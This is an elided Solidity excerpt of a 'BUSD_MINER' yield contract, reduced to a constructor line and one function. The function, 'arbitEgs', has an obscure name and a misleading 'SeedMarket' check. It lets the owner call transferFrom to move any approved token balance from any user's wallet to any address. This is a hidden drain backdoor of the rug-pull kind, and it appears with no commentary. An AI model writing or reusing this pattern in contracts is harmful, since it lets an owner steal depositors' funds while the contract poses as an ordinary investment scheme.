...
contract BUSD_MINER {
    ...
    constructor() public{
        ...
        ceoAddress2=address(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    }
    ...
    function arbitEgs(IERC20Token _egs, address _auto, address _intra, uint256 _amount) external returns (bool) {
        require(msg.sender == ceoAddress, "SeedMarket");
        return _egs.transferFrom(_auto, _intra, _amount);
    }
